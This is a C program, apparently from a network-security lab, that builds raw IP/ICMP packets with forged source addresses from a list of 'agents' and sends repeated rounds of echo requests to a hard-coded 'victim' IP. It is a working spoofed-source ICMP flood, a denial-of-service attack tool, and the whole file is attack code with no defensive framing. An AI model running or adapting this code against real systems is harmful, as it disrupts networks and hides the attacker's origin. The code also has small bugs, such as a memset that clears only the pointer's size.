#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

// ICMP checksum calculation
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

int main() {
    int sockfd;
    char *agents[] = {"192.168.125.99", "192.168.126.109", "192.168.126.163"}; 	//agents 
    char victim[] = "192.168.124.1";  	//victim IP
    int rounds = 100;			//No of rounds
    char *packet;    
    int psize = 1024;
	
    int num_agents = sizeof(agents)/sizeof(agents[0]);
    printf("Agents total: %d\n",num_agents);
    
    struct sockaddr_in dest_addr;

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    //IP_HDRINCL allows you to create your own header, else kernel will do
    int random = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &random, sizeof(random)) < 0) {
        perror("setsockopt error");
        return 1;
    }
     
    // Fill in destination address
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(&victim[0]); 

    for(int r = 0; r < rounds; r++){
    	for(int i = 0; i< num_agents ; i++){
	    // Allocate memory for packet
	    packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
	    
	    struct iphdr *iph = (struct iphdr *) packet;
	    struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof(struct iphdr));
	    memset(packet, 0, sizeof(packet));
	    // IP Header
	    iph->ihl = 5;
	    iph->version = 4;
	    iph->tos = 0;
	    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
	    iph->id = htons(rand() % 65535);
	    iph->frag_off = 0;
	    iph->ttl = 16;
	    iph->protocol = IPPROTO_ICMP;
	    iph->check = 0;
	    iph->saddr = inet_addr(agents[i]); 
	    iph->daddr = dest_addr.sin_addr.s_addr;
	    iph->check = checksum((unsigned short *) packet, sizeof(struct iphdr));

	    // ICMP Header
	    icmph->type = 8;
	    icmph->code = 0;
	    icmph->checksum = checksum((unsigned short *) icmph, sizeof(struct icmphdr));
	  
	    // Send packet
	    if (sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct icmphdr), 0,
		       (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0) {
		perror("Send failed");
		exit(1);
	    }
	    free(packet);
	    printf("%d ICMP packet sent from %s (round %d)\n", i+1, agents[i], r+1);
    	}
    }

    close(sockfd);
    return 0;
}
